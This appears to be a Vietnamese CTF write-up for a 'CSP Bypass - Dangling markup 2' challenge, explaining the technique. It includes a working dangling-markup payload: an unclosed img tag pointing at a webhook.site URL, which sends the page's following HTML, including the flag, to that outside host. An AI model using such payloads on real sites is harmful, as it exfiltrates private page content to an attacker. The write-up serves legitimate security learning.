```diff  
-  Web -  Client Challenges 
```

## 2. CSP Bypass -  Dangling markup 2 [50 Points]

  - Truy cập challenge ta có trang web như sau

    ![2](img/2.jpg)

  - Trang web sẽ hiện thị ra dòng chữ **Welcome** cùng với các ký tự mà ta nhập vào

    ![2-1](img/2-1.jpg)

  - Thử với payload ```Reflect XSS``` đơn giản để kiểm tra xem có fillter gì không, và ta thấy nó bị chặn bởi **Content Security Policy**

    ![2-2](img/2-2.jpg)

  - Kiểm tra CSP của trang ta thấy nó không cho phép thực thi script trong trang (giá trị none nghĩa là nó không fetch dữ liệu script từ bất kỳ nguồn nào hết)

    ![2-3](img/2-3.jpg)

  - Thử kiểm tra độ an toàn của CSP bằng trang web [CSP Evaluator](https://csp-evaluator.withgoogle.com/) ta có kết quả như sau

    ![2-4](img/2-4.jpg)

  - Như hình trên, ta sẽ thấy rằng tất cả các Policy đều an toàn, chỉ có dòng cuối gợi ý cho ta về DOM-Based XSS. Thử payload DOM-Based XSS ta thấy có thể khai thác được

    ![2-5](img/2-5.jpg)

  - Tới đây, dựa vào tên tiêu đề Challenge và gợi ý trên, ta có thể đoán rằng đây là DOM-Based XSS dựa vào kỹ thuật *Dangling Markup* . Sau khi search google về kỹ thuật này, ta có thể thấy nó được mô tả chi tiết ở [đây](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) gồm cả khái niệm và cách khai thác.

  - Cụ thể, *Dangling markup* là khi attacker chèn 1 thẻ html vào DOM mà không đóng các attribute của thẻ đó lại, để nó 'treo lủng lẳng' như sau:

    ```html 
    <img src='attacker-server.com/
    ```  

    Khi trình duyệt render phản hồi, nó sẽ duyệt các ký tự tiếp theo của thẻ trên, đến khi gặp dấu single quote (```'```) tiếp theo thì dừng lại, các ký tự vừa được duyệt sẽ trở thành một phần của đường dẫn cho thuộc tính ```src```. Khi giao diện được render, request từ ```src``` được gửi tới server của attacker, họ sẽ đọc được 1 phần nội dung của trang web mà đáng ra họ không thể thấy.

  - Quay lại vấn đề cũ, để thực thi được DOM-Based XSS và gửi request ra ngoài, ta áp dụng **Dangling markup** sử dụng một thẻ html nào đó có thể gửi request tới đường dẫn chỉ định. 

    Ta thử với thẻ ```img``` và thấy rằng nó gửi một request tới webhook của mình kèm theo tham số là chuỗi html đằng sau 
    ```diff
    - Payload: </h1> <img src='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?
    ```
    Giải thích payload:
    - Phần ```</h1>``` là để bypass thẻ ```<h1>``` sẵn có của DOM mà ta inject
    - Thẻ img em áp dụng Dangling Markup, phải sử dụng Single Quote thay vì Double Quote vì ta mong muốn đọc được nội dung đến dấu ' tiếp theo (chỗ icon) chứ không phải dấu " tiếp theo -> Nhằm mục đích đọc được đoạn có chứa Flag
    - Kết quả như sau

    ![2-6](img/2-6.jpg)

  - Vào phần ***fill in this form*** và gửi link vulnerable trên đến con bot, khi nó mở đường link thì thẻ ```img``` sẽ tự động gửi request tới webhook của chúng ta, kèm theo chuỗi html đằng sau. Nhờ đó ta có thể thấy được đoạn html chứa flag mà bot thấy được.

  - Tuy nhiên, đợi 10p vẫn không thấy request tới, sau khi tìm hiểu mãi không biết được nguyên nhân, em đoán là server đã lọc kí tự img hay src gì đó  

  - Em đã thử tìm kiếm xem còn thuộc tính nào tự động gửi request lấy image tương tự src không, thì tìm thấy được thuộc tính background trong table

    ![2-8](img/2-8.jpg)

  - Cuối cùng ta gửi payload lại và nhận được flag như ta tính.

    ![2-10](img/2-10.jpg)



```diff
- Flag: D4NGL1NG_M4RKUP_W1TH_CHR0ME_NO_N3W_LINE
```

